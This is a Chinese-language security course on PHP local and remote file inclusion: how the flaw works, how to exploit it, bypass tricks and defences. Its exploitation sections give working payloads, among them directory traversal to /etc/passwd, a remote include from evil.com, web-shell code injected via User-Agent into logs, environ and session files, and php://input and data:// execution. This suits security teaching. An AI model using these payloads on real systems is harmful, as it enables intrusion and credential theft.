# 文件包含漏洞

## 课程概述

本课程详细讲解文件包含漏洞的原理、利用方法和防御措施。通过理论学习和靶场实战，全面掌握文件包含漏洞的攻防技术。

### 课程安排

| 模块 | 内容 | 时长 | 学习目标 |
|------|------|------|----------|
| **第一部分** | 漏洞概述与利用方法 | 2小时 | 理解文件包含原理、掌握各种利用技巧 |
| **第二部分** | 绕过技巧 | 2小时 | 掌握伪协议绕过、截断绕过等技巧 |
| **第三部分** | 防御方法 | 30分钟 | 学习如何防御文件包含漏洞 |

---

## 第一部分：漏洞概述与利用方法(2小时)

### 一、什么是文件包含漏洞

#### 1.1 基本概念

文件包含漏洞是指当Web应用程序使用用户可控的变量来动态包含文件时，如果没有进行严格的过滤和验证，攻击者可以通过修改参数来包含任意文件，从而导致敏感信息泄露、代码执行等安全问题。

**简单示例**：
```php
<?php
// 危险代码
$file = $_GET['file'];
include($file);
?>
```

访问：`http://example.com/index.php?file=config.php` 就会包含并执行config.php文件。

#### 1.2 文件包含的类型

| 类型 | 说明 | 示例 |
|------|------|------|
| **本地文件包含(LFI)** | 包含服务器本地文件 | `?file=../../../../etc/passwd` |
| **远程文件包含(RFI)** | 包含远程服务器文件 | `?file=http://evil.com/shell.txt` |

**注意**：PHP 5.2.0之后，默认关闭了远程文件包含（`allow_url_include=Off`），所以实战中更常见的是本地文件包含。

### 二、常见的文件包含函数

PHP中有多个函数可以包含文件，它们的行为略有不同：

| 函数 | 说明 | 文件不存在时 | 是否执行PHP代码 |
|------|------|--------------|----------------|
| `include()` | 包含并运行指定文件 | 产生警告，继续执行 | ✅ 是 |
| `include_once()` | 同include，但只包含一次 | 产生警告，继续执行 | ✅ 是 |
| `require()` | 包含并运行指定文件 | 产生致命错误，停止执行 | ✅ 是 |
| `require_once()` | 同require，但只包含一次 | 产生致命错误，停止执行 | ✅ 是 |

**代码示例**：
```php
<?php
// 示例1: include
include('header.php');  // 包含页面头部

// 示例2: require
require('config.php');  // 包含配置文件，不存在则停止运行

// 示例3: 动态包含（危险）
$page = $_GET['page'];
include($page . '.php');  // 如果$page可控，存在文件包含漏洞
?>
```

### 三、漏洞代码分析

#### 3.1 典型的漏洞代码

```php
<?php
// 漏洞示例1: 完全无过滤
$file = $_GET['file'];
include($file);

// 漏洞示例2: 自动添加后缀（可被绕过）
$file = $_GET['file'];
include($file . '.php');

// 漏洞示例3: 限制目录（可被绕过）
$file = $_GET['file'];
include('pages/' . $file);
?>
```

#### 3.2 漏洞利用方式

**方式1：读取敏感文件**
```
http://example.com/index.php?file=../../../../etc/passwd
http://example.com/index.php?file=../../../../var/www/html/config.php
```

**方式2：包含上传的文件**
```
http://example.com/index.php?file=uploads/shell.jpg
```

**方式3：包含日志文件**
```
http://example.com/index.php?file=../../../../var/log/apache2/access.log
```

### 四、本地文件包含(LFI)利用

#### 4.1 基础本地文件包含

**漏洞代码**：
```php
<?php
$file = $_GET['file'];
include($file);
?>
```

**攻击示例**：
```
# Linux系统
?file=/etc/passwd
?file=../../../../etc/passwd

# Windows系统
?file=C:/Windows/system.ini
?file=../../../../Windows/system.ini
```

**目录遍历符号**：
- `../` - 返回上一级目录
- `../../../../` - 返回多级目录

#### 4.2 常见敏感文件路径

**Linux系统**：
```
/etc/passwd          # 用户信息
/etc/shadow          # 密码hash（需要root权限）
/etc/hosts           # 主机配置
/var/log/apache2/access.log   # Apache访问日志
/var/log/nginx/access.log     # Nginx访问日志
/proc/self/environ   # 环境变量
/home/user/.bash_history      # 命令历史
```

**Windows系统**：
```
C:/Windows/system.ini
C:/Windows/win.ini
C:/boot.ini
C:/inetpub/logs/LogFiles/W3SVC1/
```

**Web应用配置文件**：
```
/var/www/html/config.php
/var/www/html/.env
/var/www/html/database.php
```

### 五、包含日志文件getshell

#### 5.1 原理

当Web服务器将用户的请求记录到访问日志时，如果我们在请求中插入PHP代码，这些代码会被记录到日志文件。然后通过文件包含漏洞包含日志文件，日志中的PHP代码就会被执行。

#### 5.2 攻击步骤

**步骤1：找到日志文件路径**

Apache日志路径：
- `/var/log/apache2/access.log` (Debian/Ubuntu)
- `/var/log/httpd/access_log` (CentOS/RHEL)

Nginx日志路径：
- `/var/log/nginx/access.log`

**步骤2：向日志写入PHP代码**

方法1：修改User-Agent
```http
GET /index.php HTTP/1.1
Host: example.com
User-Agent: <?php system($_GET['cmd']); ?>
```

方法2：在URL中插入代码
```
http://example.com/<?php system($_GET['cmd']); ?>
```

**步骤3：包含日志文件**
```
http://example.com/index.php?file=../../../../var/log/apache2/access.log&cmd=whoami
```

#### 5.3 实战示例

使用Burp Suite修改User-Agent：
```http
GET /index.php HTTP/1.1
Host: 192.168.1.100
User-Agent: <?php @eval($_POST['cmd']); ?>
Connection: close
```

然后包含日志：
```
http://192.168.1.100/index.php?file=../../../../var/log/apache2/access.log
```

访问后使用POST发送`cmd=phpinfo();`即可执行代码。

### 六、包含环境变量getshell

#### 6.1 /proc/self/environ

在Linux系统中，`/proc/self/environ`文件包含当前进程的环境变量。如果能够修改环境变量（如User-Agent会被记录到环境变量），就可以实现getshell。

#### 6.2 利用步骤

**步骤1：修改User-Agent注入代码**
```http
GET /index.php HTTP/1.1
Host: example.com
User-Agent: <?php system($_GET['cmd']); ?>
```

**步骤2：包含environ文件**
```
http://example.com/index.php?file=../../../../proc/self/environ&cmd=id
```

#### 6.3 限制条件

- 需要有读取`/proc/self/environ`的权限
- User-Agent需要被写入环境变量
- 部分系统可能禁止访��/proc目录

### 七、包含Session文件

#### 7.1 Session文件位置

PHP默认将Session保存在文件中：
```
/var/lib/php/sessions/sess_[SESSIONID]
/tmp/sess_[SESSIONID]
```

SESSIONID可以从Cookie中获取：`PHPSESSID=abc123`

#### 7.2 利用方法

**步骤1：控制Session内容**

如果网站将用户输入存入Session：
```php
<?php
session_start();
$_SESSION['username'] = $_POST['username'];  // 可控
?>
```

**步骤2：注入恶意代码**
```
POST /login.php
username=<?php system($_GET['cmd']); ?>
```

**步骤3：包含Session文件**
```
http://example.com/index.php?file=../../../../tmp/sess_abc123&cmd=id
```

---

## 第二部分：绕过技巧(2小时)

### 一、伪协议绕过

PHP支持多种伪协议（Wrapper），可以用于绕过某些限制或直接执行代码。

#### 1.1 php://filter - 读取源码

**功能**：读取文件内容，常用于读取PHP源码（不执行）。

**基本语法**：
```
php://filter/read=convert.base64-encode/resource=文件路径
```

**攻击示例**：
```
# 读取index.php源码（base64编码）
?file=php://filter/read=convert.base64-encode/resource=index.php

# 读取config.php源码
?file=php://filter/read=convert.base64-encode/resource=config.php
```

**解码**：
```bash
echo "PD9waHAg..." | base64 -d
```

**为什么使用base64编码？**
- 如果直接包含PHP文件，代码会被执行而不是显示
- 使用base64编码后，可以看到源码内容
- 解码后就能看到敏感信息（数据库密码等）

#### 1.2 php://input - 执行POST数据

**功能**：读取POST请求的原始数据，可以用来执行POST提交的PHP代码。

**使用条件**：
- `allow_url_include=On`（PHP 5.2.0+默认为Off）

**攻击示例**：

请求：
```
POST /index.php?file=php://input HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

<?php system('whoami'); ?>
```

或者：
```
POST /index.php?file=php://input HTTP/1.1

<?php phpinfo(); ?>
```

#### 1.3 data:// - 直接执行代码

**功能**：使用data://协议直接传递数据。

**使用条件**：
- `allow_url_include=On`

**攻击示例**：
```
# 执行PHP代码
?file=data://text/plain,<?php system('whoami'); ?>

# base64编码方式
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
```

**编码PHP代码**：
```bash
echo '<?php system("whoami"); ?>' | base64
# 输出: PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4K
```

#### 1.4 zip:// - 包含压缩文件

**功能**：访问zip压缩包中的文件。

**攻击步骤**：

1. 创建shell.php
```php
<?php phpinfo(); ?>
```

2. 压缩为shell.zip
```bash
zip shell.zip shell.php
```

3. 上传shell.zip（伪装成图片）

4. 包含zip文件中的shell.php
```
?file=zip://uploads/shell.zip%23shell.php
```

**注意**：`#`需要URL编码为`%23`

#### 1.5 phar:// - 包含phar文件

**功能**：类似zip://，用于包含phar归档文件。

**使用方法**：
```
?file=phar://uploads/shell.phar/shell.php
```

### 二、截断绕过

当代码强制添加后缀时，可以使用截断技巧绕过。

#### 2.1 %00截断（PHP < 5.3.4）

**漏洞代码**：
```php
<?php
$file = $_GET['file'];
include($file . '.php');  // 强制添加.php后缀
?>
```

**绕过方法**：
```
?file=../../../../etc/passwd%00

# 处理流程：
# 1. $file = "../../../../etc/passwd%00"
# 2. include($file . '.php')
# 3. include("../../../../etc/passwd%00.php")
# 4. %00（NULL字节）导致字符串截断
# 5. 实际包含: ../../../../etc/passwd
```

**限制条件**：
- 仅在PHP < 5.3.4版本有效
- magic_quotes_gpc=Off

#### 2.2 长度截断（PHP < 5.2.8）

**原理**：当文件路径长度超过系统限制时，超出部分会被截断。

**Windows系统**：路径最大长度为256字节
**Linux系统**：路径最大长度为4096字节

**绕过方法**：
```
?file=shell.jpg/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
```

通过大量的`/./`使路径超长，后面添加的`.php`被截断。

#### 2.3 点号截断（Windows）

**Windows特性**：文件名末尾的`.`会被自动去除。

**绕过方法**：
```
?file=../../../../etc/passwd.

# Windows系统会自动去除末尾的点号
# 即使代码添加.php，最终路径变为: ../../../../etc/passwd.php
# 但Windows处理时会去掉点，变成: ../../../../etc/passwd
```

**限制**：仅在Windows系统有效

---

## 第三部分：防御方法

### 一、代码层面防御

#### 1.1 白名单验证

**推荐做法**：使用白名单限制可包含的文件。

```php
<?php
// ✅ 安全做法：白名单
$allowed_pages = array('home', 'about', 'contact');
$page = $_GET['page'];

if (in_array($page, $allowed_pages, true)) {
    include($page . '.php');
} else {
    include('home.php');  // 默认页面
}
?>
```

#### 1.2 过滤危险字符

```php
<?php
// ✅ 过滤路径遍历字符
$file = $_GET['file'];
$file = str_replace(array('../', '..\\', './'), '', $file);
$file = basename($file);  // 只保留文件名，去除路径

include('pages/' . $file);
?>
```

**注意**：单纯的字符串替换不够安全，可能被双写绕过。

#### 1.3 使用realpath()验证

```php
<?php
// ✅ 使用realpath验证路径
$base_dir = '/var/www/html/pages/';
$file = $_GET['file'];
$path = realpath($base_dir . $file);

// 确保文件在允许的目录内
if ($path && strpos($path, $base_dir) === 0 && file_exists($path)) {
    include($path);
} else {
    die('非法访问');
}
?>
```

#### 1.4 禁用危险函数

**修改php.ini**：
```ini
disable_functions = system,exec,passthru,shell_exec,proc_open,popen
```

### 二、服务器配置防御

#### 2.1 关闭远程文件包含

**php.ini配置**：
```ini
allow_url_include = Off
allow_url_fopen = Off
```

#### 2.2 open_basedir限制

**限制PHP只能访问指定目录**：
```ini
open_basedir = /var/www/html:/tmp
```

这样即使存在文件包含漏洞，也无法访问`/etc/passwd`等系统文件。

#### 2.3 关闭错误显示

```ini
display_errors = Off
log_errors = On
error_log = /var/log/php_errors.log
```

避免泄露敏感路径信息。

### 三、安全编码最佳实践

#### 3.1 避免用户输入直接用于文件路径

```php
<?php
// ❌ 危险
include($_GET['file']);

// ✅ 安全：使用映射
$pages = array(
    'home' => 'pages/home.php',
    'about' => 'pages/about.php'
);

$page = $_GET['page'];
if (isset($pages[$page])) {
    include($pages[$page]);
} else {
    include('pages/home.php');
}
?>
```

#### 3.2 文件包含前验证文件类型

```php
<?php
$file = $_GET['file'];
$ext = pathinfo($file, PATHINFO_EXTENSION);

if ($ext !== 'php') {
    die('只允许包含PHP文件');
}

// 进一步验证...
?>
```

#### 3.3 使用框架提供的安全方法

现代PHP框架（如Laravel、Symfony）提供了安全的文件包含机制：

```php
// Laravel示例
return view('pages.home');  // 框架内部处理，不直接使用用户输入
```

### 四、监控与日志

#### 4.1 记录文件包含操作

```php
<?php
function safe_include($file) {
    // 记录日志
    error_log("File include attempt: " . $file . " from IP: " . $_SERVER['REMOTE_ADDR']);

    // 验证文件
    if (!file_exists($file)) {
        error_log("File not found: " . $file);
        return false;
    }

    include($file);
    return true;
}
?>
```

#### 4.2 使用WAF（Web应用防火墙）

- ModSecurity
- Cloudflare WAF
- 宝塔面板防火墙

**检测规则示例**：
```
# 检测路径遍历
SecRule ARGS "\.\./" "id:1001,deny,status:403,msg:'Path Traversal Attack'"

# 检测敏感文件
SecRule ARGS "/etc/passwd" "id:1002,deny,status:403,msg:'Sensitive File Access'"
```

---

## 课程总结

### 核心知识点

| 模块 | 核心要点 |
|------|----------|
| **漏洞概述** | include/require函数、本地/远程文件包含、目录遍历 |
| **利用方法** | 读取敏感文件、包含日志getshell、包含环境变量、Session利用 |
| **绕过技巧** | 伪协议（filter/input/data/zip）、截断绕过（%00/长度/点号） |
| **防御方法** | 白名单、路径验证、配置加固、安全编码 |

### 安全建议

#### 开发者角度

1. ✅ 避免使用用户输入作为文件路径
2. ✅ 使用白名单限制可包含文件
3. ✅ 使用realpath()验证路径合法性
4. ✅ 配置open_basedir限制访问范围
5. ✅ 关闭allow_url_include
6. ✅ 记录所有文件包含操作日志
7. ✅ 定期审计代码中的include/require调用

#### 渗透测试角度

1. 🔍 查找所有include/require调用
2. 🔍 测试目录遍历（../）
3. 🔍 尝试读取敏感文件（/etc/passwd、config.php）
4. 🔍 测试各种伪协议（filter、input、data）
5. 🔍 尝试包含日志文件
6. 🔍 测试截断绕过（%00、长度截断）
7. 🔍 检查文件上传功能，结合文件包含利用

